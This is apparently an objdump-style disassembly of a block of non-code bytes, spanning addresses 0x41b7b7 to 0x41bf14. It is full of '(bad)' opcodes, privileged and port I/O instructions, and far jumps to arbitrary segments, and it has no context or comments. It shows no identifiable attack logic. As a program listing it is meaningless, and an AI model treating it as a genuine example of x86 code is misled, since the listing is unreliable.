  41b7b7:	rcl    BYTE PTR [edi+ebx*2],0x7a
  41b7bb:	fisttp QWORD PTR [eax+0x4c]
  41b7be:	xchg   ecx,eax
  41b7bf:	adc    al,0x47
  41b7c1:	xchg   esp,eax
  41b7c2:	repnz and DWORD PTR [edx+ebp*2+0x424fd89f],ebp
  41b7ca:	scas   al,BYTE PTR es:[edi]
  41b7cb:	jns    0x41b756
  41b7cd:	and    ebx,DWORD PTR [ebx-0x49]
  41b7d0:	pop    edx
  41b7d1:	rol    al,0x85
  41b7d4:	xor    edi,ebp
  41b7d6:	ja     0x41b81c
  41b7d8:	call   0x59a69b88
  41b7dd:	jne    0x41b79f
  41b7df:	or     eax,0xd98f228f
  41b7e4:	dec    ebx
  41b7e5:	aad    0x37
  41b7e7:	jp     0x41b771
  41b7e9:	sbb    dh,BYTE PTR [edi-0x39]
  41b7ec:	arpl   di,ax
  41b7ee:	mov    edi,0xee662973
  41b7f3:	pushf  
  41b7f4:	fcom   QWORD PTR [edx+0x62]
  41b7f7:	ret    
  41b7f8:	mov    ds:0x94f7d971,eax
  41b7fd:	stos   BYTE PTR es:[edi],al
  41b7fe:	mov    al,ds:0xd48c4228
  41b803:	jae    0x41b7c8
  41b805:	push   ebx
  41b806:	sbb    al,0x5e
  41b808:	fdiv   DWORD PTR [edi]
  41b80a:	test   eax,0x59168917
  41b80f:	enter  0x70e8,0x11
  41b813:	and    eax,esp
  41b815:	into   
  41b816:	and    DWORD PTR [edx+0x19],edi
  41b819:	mov    al,0x2f
  41b81b:	jae    0x41b824
  41b81d:	sub    edx,edx
  41b81f:	push   ebp
  41b820:	inc    edi
  41b821:	rcl    edx,cl
  41b823:	std    
  41b824:	push   edx
  41b825:	clc    
  41b826:	js     0x41b85f
  41b828:	mov    ch,0xae
  41b82a:	fwait
  41b82b:	out    dx,al
  41b82c:	xor    dh,0xe1
  41b82f:	loope  0x41b884
  41b831:	xchg   esp,eax
  41b832:	pop    edx
  41b833:	pusha  
  41b834:	pushf  
  41b835:	sbb    edi,DWORD PTR [esi]
  41b837:	vcvtsi2ss xmm1,xmm6,DWORD PTR [ebx-0x1f3e09e6]
  41b83f:	arpl   sp,si
  41b841:	sub    ch,BYTE PTR [edx]
  41b843:	cli    
  41b844:	outs   dx,DWORD PTR ds:[esi]
  41b845:	lds    edi,FWORD PTR [eax-0x23515f9d]
  41b84b:	sti    
  41b84c:	and    dl,cl
  41b84e:	inc    ebp
  41b84f:	inc    ebx
  41b850:	outs   dx,BYTE PTR ds:[esi]
  41b851:	adc    DWORD PTR [esi-0x44],edx
  41b854:	or     DWORD PTR [edx+0x6e1e4e56],ecx
  41b85a:	cmp    DWORD PTR [ecx+0x3c],0xb8c9c85c
  41b861:	push   ebp
  41b862:	mov    ebx,0x380986a0
  41b867:	std    
  41b868:	adc    cl,bl
  41b86a:	mov    bl,0xf0
  41b86c:	mov    DWORD PTR [ebx+0x32],ecx
  41b86f:	retf   0x97a0
  41b872:	nop
  41b873:	icebp  
  41b874:	dec    ebp
  41b875:	test   al,0x82
  41b877:	xor    ebx,DWORD PTR [eax-0x2b0cb9e4]
  41b87d:	xlat   BYTE PTR ds:[ebx]
  41b87e:	lods   al,BYTE PTR ds:[esi]
  41b87f:	data16 sbb al,0xac
  41b882:	call   0xe43e:0xc95de33a
  41b889:	jnp    0x41b894
  41b88b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b88c:	or     DWORD PTR [esi+0x6033182b],edx
  41b892:	test   eax,0xd6b20f50
  41b897:	cs outs dx,BYTE PTR cs:[esi]
  41b89a:	or     ecx,ebx
  41b89c:	hlt    
  41b89d:	std    
  41b89e:	fld    TBYTE PTR [ebp+0x3e]
  41b8a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b8a3:	xor    ah,BYTE PTR [edi+0x161f5365]
  41b8a9:	jo     0x41b848
  41b8ab:	pop    ds
  41b8ac:	xor    BYTE PTR [eax+ebx*4-0x6494c46],dh
  41b8b3:	ret    0x8cf
  41b8b6:	test   al,0xd3
  41b8b8:	(bad)  
  41b8b9:	xlat   BYTE PTR ds:[ebx]
  41b8ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b8bb:	retf   
  41b8bc:	mov    bl,BYTE PTR [edi]
  41b8be:	sub    al,0xe6
  41b8c0:	pop    ecx
  41b8c1:	pop    ebp
  41b8c2:	call   0x65a833bc
  41b8c7:	pop    es
  41b8c8:	mov    dh,0x69
  41b8ca:	ret    
  41b8cb:	jnp    0x41b863
  41b8cd:	nop
  41b8ce:	mov    ds:0xeced2f6f,al
  41b8d3:	adc    bl,BYTE PTR [edi+0x216e991e]
  41b8d9:	gs loope 0x41b929
  41b8dc:	cmp    cl,BYTE PTR [ebx]
  41b8de:	cmp    DWORD PTR [edi-0x7],ebp
  41b8e1:	jmp    0x475e:0x3a0d1d89
  41b8e8:	call   0xb138ee35
  41b8ed:	mov    esi,0x5bc40897
  41b8f2:	and    dh,dl
  41b8f4:	mov    bh,0x4a
  41b8f6:	add    BYTE PTR [edx],cl
  41b8f8:	inc    ebx
  41b8f9:	test   esp,0x91ba1a8d
  41b8ff:	es es js 0x41b901
  41b903:	fstp   DWORD PTR [eax]
  41b905:	mov    eax,edx
  41b907:	ins    BYTE PTR es:[edi],dx
  41b908:	div    DWORD PTR [esi+edx*4+0x4bf6e9cb]
  41b90f:	ds inc ebp
  41b911:	inc    esp
  41b912:	or     eax,ecx
  41b914:	cdq    
  41b915:	jg     0x41b926
  41b917:	scas   eax,DWORD PTR es:[edi]
  41b918:	add    cl,BYTE PTR [ebx+0x30e9fc55]
  41b91e:	add    al,BYTE PTR [eax]
  41b920:	add    dh,al
  41b922:	retf   
  41b923:	xlat   BYTE PTR ds:[ebx]
  41b924:	vpsubusw xmm2,xmm4,xmm6
  41b928:	retf   
  41b929:	xor    esp,DWORD PTR [ecx-0x4526deca]
  41b92f:	push   esp
  41b930:	cmp    al,0xf0
  41b932:	out    0x7f,al
  41b934:	js     0x41b946
  41b936:	jle    0x41b9b0
  41b938:	js     0x41b90e
  41b93a:	mov    ds:0x2903f306,al
  41b93f:	add    al,0x13
  41b941:	inc    esi
  41b942:	(bad)  
  41b943:	call   0xc589:0x619c0651
  41b94a:	ret    0xe294
  41b94d:	and    bl,cl
  41b94f:	repnz in al,0x21
  41b952:	ins    BYTE PTR es:[edi],dx
  41b953:	cwde   
  41b954:	int    0x9e
  41b956:	add    cl,al
  41b958:	adc    dh,BYTE PTR [eax+0x5e80e9ca]
  41b95e:	pop    esi
  41b95f:	dec    ecx
  41b960:	nop
  41b961:	leave  
  41b962:	dec    ecx
  41b963:	mov    cl,cl
  41b965:	mov    esp,0x27d152e9
  41b96a:	(bad)  
  41b96b:	adc    edx,eax
  41b96d:	mov    dl,0x73
  41b96f:	ins    BYTE PTR es:[edi],dx
  41b970:	js     0x41b939
  41b972:	pop    esi
  41b973:	sub    dh,bl
  41b975:	push   ebx
  41b976:	adc    BYTE PTR ds:0x6e914c9a,al
  41b97c:	dec    esp
  41b97d:	loopne 0x41b9ad
  41b97f:	mov    esi,0xf9989f60
  41b984:	pushf  
  41b985:	jge    0x41b989
  41b987:	ror    DWORD PTR [ebx-0x789e10f2],0x0
  41b98e:	dec    ebp
  41b98f:	xchg   ecx,eax
  41b990:	mov    edx,0x1f13531c
  41b995:	(bad)  
  41b996:	pop    esi
  41b997:	test   al,0x3f
  41b999:	jl     0x41b984
  41b99b:	aas    
  41b99c:	out    dx,al
  41b99d:	push   ds
  41b99e:	js     0x41b984
  41b9a0:	in     al,0x6d
  41b9a2:	(bad)  
  41b9a3:	jns    0x41b9de
  41b9a5:	stc    
  41b9a6:	xor    dh,BYTE PTR [esi-0x65bcfe5c]
  41b9ac:	pop    esp
  41b9ad:	push   ecx
  41b9ae:	jnp    0x41b97c
  41b9b0:	mov    al,ds:0xb2f46b44
  41b9b5:	xchg   esi,eax
  41b9b6:	aaa    
  41b9b7:	fiadd  WORD PTR ds:0xfc20ccb0
  41b9bd:	adc    eax,0x3d1656b3
  41b9c2:	and    BYTE PTR [bx+di+0xa43],0x2e
  41b9c8:	inc    DWORD PTR [ebp+0x7b]
  41b9cb:	mov    ah,BYTE PTR [esi+0x3b]
  41b9ce:	data16 and bl,BYTE PTR [edi-0x581241c4]
  41b9d5:	cld    
  41b9d6:	mov    esp,0xa2774a0c
  41b9db:	xchg   esp,eax
  41b9dc:	dec    esi
  41b9dd:	arpl   WORD PTR [edi-0xe],sp
  41b9e0:	ja     0x41ba0e
  41b9e2:	test   BYTE PTR [edx-0x15],ch
  41b9e5:	dec    eax
  41b9e6:	dec    eax
  41b9e7:	push   cs
  41b9e8:	dec    ebp
  41b9e9:	outs   dx,DWORD PTR gs:[esi]
  41b9eb:	add    BYTE PTR [esi-0x3a86ab81],dl
  41b9f1:	jp     0x41ba58
  41b9f3:	or     ecx,DWORD PTR [edx]
  41b9f5:	xchg   esi,eax
  41b9f6:	and    eax,0xc0416aad
  41b9fb:	scas   al,BYTE PTR es:[edi]
  41b9fc:	dec    eax
  41b9fd:	ds and al,0x19
  41ba00:	jbe    0x41ba78
  41ba02:	repnz push ebp
  41ba04:	jl     0x41ba5f
  41ba06:	mov    ss,WORD PTR [ebx]
  41ba08:	aaa    
  41ba09:	adc    eax,DWORD PTR ds:[eax-0x2fbce86c]
  41ba10:	out    dx,al
  41ba11:	mov    edx,0x14d31ceb
  41ba16:	out    dx,al
  41ba17:	and    DWORD PTR [esi-0x61],0xf976e323
  41ba1e:	mov    eax,ds:0xc2653417
  41ba23:	mov    al,ds:0xc6f1f8c2
  41ba28:	dec    esi
  41ba29:	nop
  41ba2a:	pop    eax
  41ba2b:	mov    bl,0x63
  41ba2d:	lahf   
  41ba2e:	lods   al,BYTE PTR ds:[esi]
  41ba2f:	rcr    BYTE PTR [esi+0x26ad1848],0xc2
  41ba36:	cmp    eax,0x528ca239
  41ba3b:	mov    ds:0xb7795d4a,al
  41ba40:	scas   eax,DWORD PTR es:[edi]
  41ba41:	sbb    bh,0xd4
  41ba44:	mov    WORD PTR [ebp-0x2f44675f],cs
  41ba4a:	in     eax,0x49
  41ba4c:	mov    bl,0x75
  41ba4e:	sbb    esp,DWORD PTR [ecx-0x4873c2c3]
  41ba54:	xlat   BYTE PTR ds:[ebx]
  41ba55:	sbb    DWORD PTR [ebp-0x41889a76],ebx
  41ba5b:	rol    dh,cl
  41ba5d:	data16 aaa 
  41ba5f:	fisttp QWORD PTR [esi]
  41ba61:	std    
  41ba62:	jmp    0x7244:0x427bf0c2
  41ba69:	retf   0x8b90
  41ba6c:	mov    esp,0xdc933968
  41ba71:	or     DWORD PTR [esi-0x16],esi
  41ba74:	jge    0x41ba71
  41ba76:	push   ss
  41ba77:	sbb    eax,0x1ca94dd1
  41ba7c:	add    BYTE PTR [ebx+ebx*1-0x13],0xbd
  41ba81:	xchg   edx,eax
  41ba82:	push   cs
  41ba83:	dec    edx
  41ba84:	inc    dh
  41ba86:	mov    ebx,DWORD PTR [eax+ebx*1-0x66]
  41ba8a:	mov    eax,0x5bc0418a
  41ba8f:	xchg   ebx,eax
  41ba90:	or     eax,0x787c08bc
  41ba95:	inc    esi
  41ba96:	in     al,0xa7
  41ba98:	mov    al,0x67
  41ba9a:	rcr    bh,1
  41ba9c:	std    
  41ba9d:	adc    dl,BYTE PTR [ebx+edi*2-0x39]
  41baa1:	jmp    0xa26a:0xf194bde0
  41baa8:	enter  0xbc02,0x6b
  41baac:	cmp    al,0xa1
  41baae:	inc    ecx
  41baaf:	push   edx
  41bab0:	fwait
  41bab1:	xor    edx,DWORD PTR [edi-0x16]
  41bab4:	clc    
  41bab5:	and    BYTE PTR [edi],bh
  41bab7:	(bad)  
  41bab8:	pop    edx
  41bab9:	nop
  41baba:	push   esi
  41babb:	mov    al,ds:0xae8701b5
  41bac0:	sub    DWORD PTR [edx],esp
  41bac2:	mov    ebx,0x66e46084
  41bac7:	add    DWORD PTR [edi-0x66],ebp
  41baca:	retf   
  41bacb:	(bad)  [ecx-0x40]
  41bace:	sbb    ch,BYTE PTR [esi+edi*1-0x35]
  41bad2:	pop    ds
  41bad3:	fistp  WORD PTR [edi]
  41bad5:	shl    BYTE PTR [edi-0x8846403],0x2c
  41badc:	and    al,BYTE PTR [ecx-0x6c6c2201]
  41bae2:	sar    DWORD PTR [edx-0x33],cl
  41bae5:	pushf  
  41bae6:	int    0xb
  41bae8:	iret   
  41bae9:	or     ecx,DWORD PTR [edi+0x25ec079a]
  41baef:	xlat   BYTE PTR ds:[ebx]
  41baf0:	sbb    al,0x44
  41baf2:	or     al,0xfb
  41baf4:	pop    esp
  41baf5:	push   esp
  41baf6:	retf   
  41baf7:	cmp    BYTE PTR [ebx+esi*2-0x16],0x59
  41bafc:	xchg   esi,eax
  41bafd:	and    ebx,DWORD PTR [edx+eiz*4+0x35e6b0d7]
  41bb04:	xor    bh,BYTE PTR [ebp+0x51]
  41bb07:	jmp    0xf3c9:0x2d3db8d7
  41bb0e:	imul   esi,DWORD PTR [edi-0x23631e83],0xc1f91057
  41bb18:	sbb    dl,BYTE PTR [edi+0x61]
  41bb1b:	cwde   
  41bb1c:	dec    esi
  41bb1d:	test   al,0xf8
  41bb1f:	dec    esi
  41bb20:	xor    al,0x51
  41bb22:	fscale 
  41bb24:	cdq    
  41bb25:	stos   DWORD PTR es:[edi],eax
  41bb26:	pop    ecx
  41bb27:	int3   
  41bb28:	repz icebp 
  41bb2a:	adc    eax,0x81d2f732
  41bb2f:	je     0x41bad6
  41bb31:	pop    edx
  41bb32:	mov    ah,0xba
  41bb34:	mov    al,0x4
  41bb36:	sub    dl,ah
  41bb38:	xchg   ecx,eax
  41bb39:	sahf   
  41bb3a:	stos   DWORD PTR es:[edi],eax
  41bb3b:	push   ss
  41bb3c:	ret    
  41bb3d:	iret   
  41bb3e:	inc    edx
  41bb3f:	cmp    edi,DWORD PTR [ebp-0x553c4e70]
  41bb45:	push   ecx
  41bb46:	es pop esi
  41bb48:	lods   eax,DWORD PTR ds:[esi]
  41bb49:	std    
  41bb4a:	mul    BYTE PTR [edx]
  41bb4c:	push   0x1e0b355d
  41bb51:	xor    edx,ecx
  41bb53:	jmp    0x41bd88
  41bb58:	enter  0xcfcf,0xc7
  41bb5c:	iret   
  41bb5d:	(bad)  
  41bb5e:	rcl    bh,1
  41bb60:	mov    esi,0xda17bf12
  41bb65:	xor    ebp,0xffffffe1
  41bb68:	mov    ah,ah
  41bb6a:	jg     0x41bbe4
  41bb6c:	adc    BYTE PTR [esi+0x78],bh
  41bb6f:	js     0x41bb3b
  41bb71:	pop    esi
  41bb72:	sbb    eax,0x4f3aaa64
  41bb77:	stos   BYTE PTR es:[edi],al
  41bb78:	mov    al,0xef
  41bb7a:	push   es
  41bb7b:	add    al,0x9
  41bb7d:	(bad)  
  41bb7e:	in     al,dx
  41bb7f:	dec    edi
  41bb80:	pop    edx
  41bb81:	mov    al,0x58
  41bb83:	ins    BYTE PTR es:[edi],dx
  41bb84:	push   esi
  41bb85:	mov    ah,0x7
  41bb87:	shl    BYTE PTR [eax-0x33],cl
  41bb8a:	shl    BYTE PTR [ecx+0xf],1
  41bb8d:	sahf   
  41bb8e:	push   cs
  41bb8f:	xchg   ebp,eax
  41bb90:	jo     0x41bb14
  41bb92:	mov    dl,0xff
  41bb94:	cmp    ebp,ecx
  41bb96:	mov    ds:0xa1d65d2e,eax
  41bb9b:	inc    esp
  41bb9c:	pop    ecx
  41bb9d:	retf   
  41bb9e:	call   0xb5a3d0ba
  41bba3:	mov    bl,0xff
  41bba5:	dec    esp
  41bba6:	lea    eax,[ebx+eax*1-0x29173d4f]
  41bbad:	and    al,0xd3
  41bbaf:	inc    ebx
  41bbb0:	xor    al,0xed
  41bbb2:	sub    eax,0x77dd15c
  41bbb7:	jo     0x41bc06
  41bbb9:	stc    
  41bbba:	shl    DWORD PTR [esi-0x5a30f933],1
  41bbc0:	jg     0x41bc24
  41bbc2:	aad    0x89
  41bbc4:	and    dh,BYTE PTR [ecx+0x6]
  41bbc7:	dec    edx
  41bbc8:	lea    ebp,[esi-0x6ef25a67]
  41bbce:	mov    edi,0xf6bc453b
  41bbd3:	test   BYTE PTR [ecx-0x1ca00f07],al
  41bbd9:	push   ds
  41bbda:	cmp    edx,DWORD PTR [edx-0x66]
  41bbdd:	inc    edx
  41bbde:	jbe    0x41bbeb
  41bbe0:	jno    0x41bc15
  41bbe2:	mov    eax,0xeac2a56
  41bbe7:	pop    ebx
  41bbe8:	in     al,0x94
  41bbea:	call   0x471f:0x4b196095
  41bbf1:	cmp    al,dl
  41bbf3:	pusha  
  41bbf4:	imul   ecx,DWORD PTR [eax],0x7
  41bbf7:	nop
  41bbf8:	add    BYTE PTR [edi-0x3a8f5bff],bl
  41bbfe:	mov    cs,ecx
  41bc00:	(bad)  
  41bc02:	jne    0x41bba8
  41bc04:	mov    esp,0xba01d890
  41bc09:	xor    BYTE PTR [edi-0x369845a0],0x7
  41bc10:	jl     0x41bc78
  41bc12:	clc    
  41bc13:	xchg   esi,eax
  41bc14:	push   edi
  41bc15:	sub    BYTE PTR [ecx],ah
  41bc17:	pop    esi
  41bc18:	aad    0x53
  41bc1a:	pop    ecx
  41bc1b:	pop    edx
  41bc1c:	int3   
  41bc1d:	jl     0x41bbba
  41bc1f:	frstor [ecx-0x3ec7b41d]
  41bc25:	pusha  
  41bc26:	add    al,0xea
  41bc28:	mov    al,ds:0x70458f3c
  41bc2d:	scas   eax,DWORD PTR es:[edi]
  41bc2e:	rcl    edi,0xf9
  41bc31:	xchg   ebp,eax
  41bc32:	jp     0x41bc6e
  41bc34:	(bad)  
  41bc35:	dec    edx
  41bc36:	(bad)  
  41bc37:	xchg   ebx,eax
  41bc38:	imul   ecx,ebp,0x62
  41bc3b:	or     BYTE PTR [esi+ecx*2],0x6e
  41bc3f:	jp     0x41bc7a
  41bc41:	pop    ss
  41bc42:	xchg   DWORD PTR [edi],esi
  41bc44:	fcom   DWORD PTR [ecx+0x4]
  41bc47:	push   0xfffffff9
  41bc49:	push   edx
  41bc4a:	pop    ecx
  41bc4b:	and    DWORD PTR [edx-0x2f155ffc],esi
  41bc51:	loopne 0x41bbed
  41bc53:	hlt    
  41bc54:	dec    eax
  41bc55:	mov    ebp,0x95ff2e65
  41bc5a:	xor    ebp,ebp
  41bc5c:	mov    ds:0xfd6aee42,eax
  41bc61:	and    al,0xce
  41bc63:	jb     0x41bcd2
  41bc65:	ja     0x41bccf
  41bc67:	xlat   BYTE PTR ds:[ebx]
  41bc68:	or     dh,BYTE PTR [ebp+0x61]
  41bc6b:	dec    esp
  41bc6c:	sti    
  41bc6d:	adc    BYTE PTR [esi-0x59],ch
  41bc70:	ficom  DWORD PTR [esp+eiz*2-0x2c]
  41bc74:	xchg   esi,eax
  41bc75:	call   0xffe2:0x75aa5f37
  41bc7c:	push   ebp
  41bc7d:	push   0x22d1b500
  41bc82:	cmp    DWORD PTR [ebx],ebp
  41bc84:	push   eax
  41bc85:	xchg   DWORD PTR [ebx+0xe1cc4c6],esp
  41bc8b:	pop    ds
  41bc8c:	dec    ebp
  41bc8d:	sbb    edi,ecx
  41bc8f:	mov    esp,0x1783b84d
  41bc94:	ja     0x41bcca
  41bc96:	(bad)  
  41bc97:	cld    
  41bc98:	(bad)  
  41bc99:	mov    ds:0xb2682e33,al
  41bc9e:	repz cmp eax,edi
  41bca1:	dec    edx
  41bca2:	inc    eax
  41bca3:	cmp    BYTE PTR [edx],dl
  41bca5:	outs   dx,DWORD PTR ds:[esi]
  41bca6:	popf   
  41bca7:	pop    esi
  41bca8:	sub    eax,0x38ac3ce2
  41bcad:	ins    BYTE PTR es:[edi],dx
  41bcae:	sbb    DWORD PTR [edx],0x3b65a8d
  41bcb4:	push   esi
  41bcb5:	mov    bl,0xee
  41bcb7:	sti    
  41bcb8:	mov    cl,BYTE PTR [edx]
  41bcba:	shl    ecx,1
  41bcbc:	loope  0x41bd13
  41bcbe:	je     0x41bc72
  41bcc0:	push   edi
  41bcc1:	mov    ds:0x4f0d4342,al
  41bcc6:	pushf  
  41bcc7:	sti    
  41bcc8:	(bad)  
  41bcc9:	lahf   
  41bcca:	jb     0x41bcfe
  41bccc:	mov    eax,ds:0xa0ea4ed5
  41bcd1:	ja     0x41bd12
  41bcd3:	or     al,0xeb
  41bcd5:	enter  0x70c0,0x5c
  41bcd9:	mov    ds:0x650e934f,eax
  41bcde:	push   0xc1f53465
  41bce3:	out    0xc6,eax
  41bce5:	repnz inc edi
  41bce7:	mov    WORD PTR [eax+0x75],cs
  41bcea:	out    0xdc,al
  41bcec:	sub    al,0x4a
  41bcee:	ror    esi,1
  41bcf0:	sti    
  41bcf1:	lock mov esi,0x8d5ef10f
  41bcf7:	or     cl,ah
  41bcf9:	gs xchg ebp,eax
  41bcfb:	and    al,0xcc
  41bcfd:	sub    eax,DWORD PTR [edi+0x195b562e]
  41bd03:	loope  0x41bd27
  41bd05:	fdivr  QWORD PTR [edi]
  41bd07:	push   eax
  41bd08:	out    dx,eax
  41bd09:	add    ecx,DWORD PTR [esi-0x7a9658b5]
  41bd0f:	mov    esp,ss
  41bd11:	adc    dl,BYTE PTR [esi-0x5856ab9b]
  41bd17:	das    
  41bd18:	iret   
  41bd19:	lods   eax,DWORD PTR ds:[esi]
  41bd1a:	add    BYTE PTR [ebp-0x56bba4e3],0xe5
  41bd21:	xchg   esp,eax
  41bd22:	(bad)
  41bd27:	adc    al,0x47
  41bd29:	adc    ah,bl
  41bd2b:	repz push esi
  41bd2d:	cli    
  41bd2e:	aaa    
  41bd2f:	and    BYTE PTR [ebp+0x22],dh
  41bd32:	shr    DWORD PTR [ecx-0x3bd3e5e7],0xd7
  41bd39:	fcmovne st,st(5)
  41bd3b:	jae    0x41bd45
  41bd3d:	into   
  41bd3e:	dec    edx
  41bd3f:	(bad)  
  41bd40:	mov    edx,0x9756bb3a
  41bd45:	in     al,dx
  41bd46:	test   BYTE PTR [edx-0x3f],bh
  41bd49:	adc    esi,DWORD PTR [ebp-0x57]
  41bd4c:	cli    
  41bd4d:	dec    ebp
  41bd4e:	mov    ds:0x298599ca,al
  41bd53:	ror    al,1
  41bd55:	(bad)  
  41bd56:	pop    ecx
  41bd57:	es out 0xa8,eax
  41bd5a:	push   ebp
  41bd5b:	mov    cl,0x72
  41bd5d:	push   esi
  41bd5e:	mov    dl,BYTE PTR [ebp+ecx*2+0x3f]
  41bd62:	fwait
  41bd63:	ret    
  41bd64:	pop    ds
  41bd65:	bound  esi,QWORD PTR [eax]
  41bd67:	push   esp
  41bd68:	jmp    0x41bdb8
  41bd6a:	jnp    0x41bdbc
  41bd6c:	sub    BYTE PTR [eax+0x6287f296],dh
  41bd72:	push   esi
  41bd73:	dec    esi
  41bd74:	ret    0xbec8
  41bd77:	shl    ah,cl
  41bd79:	ret    0x91dc
  41bd7c:	add    ch,BYTE PTR [edx-0x1a]
  41bd7f:	and    esp,esp
  41bd81:	call   0xf4049679
  41bd86:	xchg   dh,ah
  41bd88:	mov    ecx,DWORD PTR [ebp+0x8]
  41bd8b:	jmp    0x41bfc0
  41bd90:	into   
  41bd91:	leave  
  41bd92:	leave  
  41bd93:	rcr    ecx,0xc1
  41bd96:	(bad)  
  41bd97:	fldcw  WORD PTR [ebx+0x3e]
  41bd9a:	stc    
  41bd9b:	push   0xd
  41bd9d:	mov    ebp,0xeaa06b92
  41bda2:	jg     0x41be1c
  41bda4:	adc    BYTE PTR [esi+0x78],bh
  41bda7:	js     0x41bdaa
  41bda9:	daa    
  41bdaa:	hlt    
  41bdab:	or     ecx,DWORD PTR [edx-0x26]
  41bdae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bdaf:	data16 loope 0x41bd36
  41bdb2:	aaa    
  41bdb3:	pop    edi
  41bdb4:	adc    dh,BYTE PTR [ebx-0x27cf4189]
  41bdba:	leave  
  41bdbb:	outs   dx,BYTE PTR ds:[esi]
  41bdbc:	mul    BYTE PTR [edi+ebp*1+0x3cab33e7]
  41bdc3:	mov    al,ds:0x8a017103
  41bdc8:	ret    0x8903
  41bdcb:	sbb    al,0x40
  41bdcd:	into   
  41bdce:	cld    
  41bdcf:	out    0x9d,al
  41bdd1:	test   al,0x3f
  41bdd3:	int3   
  41bdd4:	dec    esp
  41bdd5:	cmp    BYTE PTR [esi+0x19],bh
  41bdd8:	or     ah,bh
  41bdda:	faddp  st(4),st
  41bddc:	test   BYTE PTR [edi-0xd],cl
  41bddf:	pop    ebp
  41bde0:	xchg   ecx,eax
  41bde1:	(bad)  
  41bde2:	aad    0xe0
  41bde4:	mov    esp,0xca6a12d5
  41bde9:	sub    eax,0x31bc1df9
  41bdee:	dec    ebp
  41bdef:	repnz mov al,ds:0x91564672
  41bdf5:	or     eax,DWORD PTR [edi+0x27]
  41bdf8:	push   eax
  41bdf9:	push   esp
  41bdfa:	push   ebp
  41bdfb:	push   0x29
  41bdfd:	xor    al,0x1c
  41bdff:	sti    
  41be00:	nop
  41be01:	xchg   edx,eax
  41be02:	mov    dl,0x68
  41be04:	jecxz  0x41bd95
  41be06:	add    DWORD PTR [ebx+0x30f24cd9],ebp
  41be0c:	inc    ebp
  41be0d:	rcl    dl,0x7f
  41be10:	in     eax,dx
  41be11:	inc    esi
  41be12:	lahf   
  41be13:	mov    WORD PTR [edi+eax*8+0x4e],gs
  41be17:	add    DWORD PTR [ebx-0x210da913],ecx
  41be1d:	cld    
  41be1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41be1f:	retf   0x1e86
  41be22:	pop    ds
  41be23:	pop    esi
  41be24:	clc    
  41be25:	adc    DWORD PTR [esi+edx*8-0x39d1db24],0x50
  41be2d:	fsub   st(6),st
  41be2f:	xchg   ebx,eax
  41be30:	popa   
  41be31:	dec    eax
  41be32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be33:	retf   
  41be34:	adc    BYTE PTR [edi-0x795551fa],0xb4
  41be3b:	sub    al,0x6b
  41be3d:	sti    
  41be3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be3f:	pushf  
  41be40:	in     al,dx
  41be41:	jl     0x41be6f
  41be43:	mov    bh,0x8c
  41be45:	adc    esi,esi
  41be47:	ss std 
  41be49:	sar    DWORD PTR [eax],cl
  41be4b:	cld    
  41be4c:	ret    
  41be4d:	fsub   QWORD PTR [ecx-0x69e4ee43]
  41be53:	jmp    0x7552:0x3348500f
  41be5a:	pop    edx
  41be5b:	xor    cl,BYTE PTR [eax]
  41be5d:	pop    edi
  41be5e:	push   ebp
  41be5f:	dec    edi
  41be60:	lock ja 0x41be07
  41be63:	fwait
  41be64:	call   0xbfd3:0x728b2b93
  41be6b:	inc    esp
  41be6c:	lahf   
  41be6d:	out    0xaa,al
  41be6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be70:	sub    edi,DWORD PTR [edi]
  41be72:	inc    ecx
  41be73:	out    0x92,eax
  41be75:	shr    DWORD PTR [esi-0x90b979e],cl
  41be7b:	rol    BYTE PTR [esi],cl
  41be7d:	fs xchg esi,eax
  41be7f:	mov    ebp,0xf32bdb3f
  41be84:	sub    edx,DWORD PTR [esi+edx*1-0x74]
  41be88:	mov    edi,DWORD PTR [edx]
  41be8a:	mov    ecx,0x8d39002c
  41be8f:	outs   dx,BYTE PTR ds:[esi]
  41be90:	pop    ecx
  41be91:	test   al,0x98
  41be93:	mov    DWORD PTR [edx-0x20],esi
  41be96:	div    BYTE PTR [edi]
  41be98:	mov    DWORD PTR [ebx+ebp*4+0x21aa522b],ebp
  41be9f:	ret    
  41bea0:	daa    
  41bea1:	shl    DWORD PTR [edi+0x64c69706],0x8
  41bea8:	add    DWORD PTR [edx+0x3],eax
  41beab:	sbb    ebp,edx
  41bead:	lahf   
  41beae:	sbb    ecx,edi
  41beb0:	add    BYTE PTR [ebp+0x6e],cl
  41beb3:	mov    WORD PTR [ebp+0x5],ds
  41beb6:	das    
  41beb7:	mov    ch,al
  41beb9:	push   ebx
  41beba:	jmp    0xb9a8:0x60323589
  41bec1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bec2:	inc    eax
  41bec3:	icebp  
  41bec4:	dec    esp
  41bec5:	inc    edx
  41bec6:	sbb    bl,BYTE PTR [esi]
  41bec8:	dec    ebp
  41bec9:	shr    BYTE PTR [eax+ebp*1],1
  41becc:	outs   dx,DWORD PTR ds:[esi]
  41becd:	dec    eax
  41bece:	fld    QWORD PTR [ebx-0x37d20b0f]
  41bed4:	push   ds
  41bed5:	dec    eax
  41bed6:	push   ebp
  41bed7:	std    
  41bed8:	mov    ch,0xd0
  41beda:	xor    eax,eax
  41bedc:	clc    
  41bedd:	arpl   WORD PTR [edx+0x62],bp
  41bee0:	in     al,dx
  41bee1:	aas    
  41bee2:	repz push cs
  41bee4:	pop    ss
  41bee5:	xchg   esi,eax
  41bee6:	dec    edi
  41bee7:	and    DWORD PTR [eax+0x36],edi
  41beea:	test   BYTE PTR ds:0xf9795a48,cl
  41bef0:	stos   BYTE PTR es:[edi],al
  41bef1:	stc    
  41bef2:	ss xchg ebx,eax
  41bef4:	loope  0x41bee0
  41bef6:	fwait
  41bef7:	pop    edi
  41bef8:	ror    DWORD PTR [ecx+eiz*4],cl
  41befb:	or     al,0x84
  41befd:	ja     0x41bec8
  41beff:	mov    edi,0x1078c046
  41bf04:	mov    edi,0x7e111289
  41bf09:	jg     0x41be8f
  41bf0b:	dec    esi
  41bf0c:	sub    cl,BYTE PTR [edx]
  41bf0e:	pusha  
  41bf0f:	mov    ds:0x3e9dbf58,eax
  41bf14:	sub    bh,BYTE PTR [edx]
